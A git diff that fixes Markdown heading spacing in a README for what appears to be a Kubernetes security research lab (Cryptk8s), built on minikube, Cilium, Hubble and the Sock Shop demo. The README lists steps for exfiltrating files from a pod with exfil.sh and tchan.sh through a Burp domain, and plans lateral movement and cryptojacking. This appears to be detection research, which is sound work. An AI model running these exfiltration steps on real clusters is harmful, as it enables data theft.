@@ -39,9 +39,9 @@ Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/
 
 ----
 
-##Deployment Instructions[Cryptk8s]
+## Deployment Instructions[Cryptk8s]
 
-###Initial deployment
+### Initial deployment
 1. To cleanup minikube: `bash cleanup.sh`
 2. To deploy minikube cluster with cilium and sockshop: `bash initiate.sh`
 3. To deploy cilium with hubble: `bash deploy_cilium.sh`
@@ -49,7 +49,7 @@ Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/
 5. Getting the IP of the front-end pod: `bash get_ip.sh`
 
 
-###Exfiltrating data
+### Exfiltrating data
 1. Get into front end pod using `bash to_front.sh`
 2. Once inside front end pod, execute `cd /tmp`
 3. Write contents of attack script onto the pod using command `cat >exfil.sh` and pasting contents
@@ -58,11 +58,11 @@ Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/
 6. Run exfil.sh with arguments: `./exfil.sh FILE_TO_BE_EXFILTRATED DOMAIN_NAME_FROM_BURP`
 7. Repeat steps 3 to 6 with script tchan.sh for timing channel exfiltration
 
-###Collecting data through hubble
+### Collecting data through hubble
 1. Follow steps in `Collecting Data with Cilium`
 2. Run command `bash observe_net.sh`
 
-###TODO
+### TODO
 1. Check hubble data collection
 2. Lateral movement
 3. Cryptojacking attack
